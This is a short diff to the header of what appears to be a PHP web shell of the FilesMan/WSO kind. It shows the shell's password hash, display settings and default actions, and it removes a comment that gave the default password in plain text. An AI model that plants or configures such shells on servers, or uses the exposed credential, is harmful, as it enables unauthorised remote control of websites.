@@ -10,7 +10,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$auth_pass = "7d25b7604cacc10ed0831ced9fd6f6bb"; // default: boaedan!
+$auth_pass = "7d25b7604cacc10ed0831ced9fd6f6bb";
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
